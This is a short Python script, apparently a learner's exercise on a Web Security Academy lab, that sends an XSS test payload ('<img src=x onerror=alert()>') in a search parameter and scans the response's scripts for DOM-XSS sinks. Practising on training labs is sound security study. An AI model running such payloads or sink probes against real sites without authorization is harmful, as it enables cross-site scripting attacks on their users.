import requests
from bs4 import BeautifulSoup

payload = "<img src=x onerror=alert()>"
url = "https://0af200fb048a4d8881022ab6008f0071.web-security-academy.net/"


response = requests.get(url + "?search=" + payload)
soup = BeautifulSoup(response.text, "html.parser")
print(response.status_code)

scripts = soup.find_all("script")
for i, script in enumerate(scripts):
    if any(
        sink in script.text
        for sink in ["document.write", "innerHTML", "location.search", "location.hash"]
    ):
        print(f"{i}=>{script.text}")
